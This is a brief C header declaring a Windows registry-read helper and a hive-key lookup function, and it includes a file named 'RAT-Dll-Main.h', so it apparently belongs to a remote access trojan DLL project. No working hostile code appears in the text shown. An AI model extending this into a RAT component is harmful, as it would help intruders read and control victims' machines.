#pragma once

#include "RAT-Dll-Main.h"

INT performRegRead(__in char* keyPath, __in char* valueName, __out void** regValue, __out DWORD* sizeRegValue);

HKEY getHiveKey(__in char* hiveKey);